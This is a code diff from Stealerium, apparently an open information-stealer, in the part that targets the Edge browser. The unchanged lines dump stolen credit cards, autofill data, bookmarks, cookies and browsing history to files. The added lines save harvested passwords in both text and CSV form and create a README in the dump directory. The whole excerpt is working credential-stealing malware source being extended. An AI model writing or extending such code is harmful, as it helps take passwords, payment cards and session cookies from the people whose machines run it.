@@ -29,7 +29,10 @@ namespace Stealerium.Target.Browsers.Edge
                     CBrowserUtils.WriteCreditCards(pCreditCards, sBDir + "\\CreditCards.txt");
                     CBrowserUtils.WriteAutoFill(pAutoFill, sBDir + "\\AutoFill.txt");
                     CBrowserUtils.WriteBookmarks(pBookmarks, sBDir + "\\Bookmarks.txt");
-                    CBrowserUtils.WritePasswords(pPasswords, sBDir + "\\Passwords.txt");
+                    CBrowserUtils.WritePasswordsToTxt(pPasswords, sBDir + "\\Passwords.txt");
+                    CBrowserUtils.WritePasswordsToCsv(pPasswords, sBDir + "\\Passwords.csv");
+                    // Create a README.txt file in the directory
+                    CBrowserUtils.CreateReadme(sBDir);
                     CBrowserUtils.WriteCookies(pCookies, sBDir + "\\Cookies.txt");
                     CBrowserUtils.WriteHistory(pHistory, sBDir + "\\History.txt");
                 }
